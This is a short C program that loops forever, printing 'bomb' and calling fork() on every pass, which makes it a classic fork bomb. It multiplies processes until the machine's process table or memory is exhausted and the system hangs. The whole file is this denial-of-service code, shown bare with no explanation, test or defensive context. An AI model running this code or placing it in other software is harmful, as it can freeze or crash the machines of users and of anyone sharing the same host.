#include <stdio.h>
#include <unistd.h>

int main() {
    while (1) {
    printf("bomb");
        fork();  
        
    }

    return 0;
}
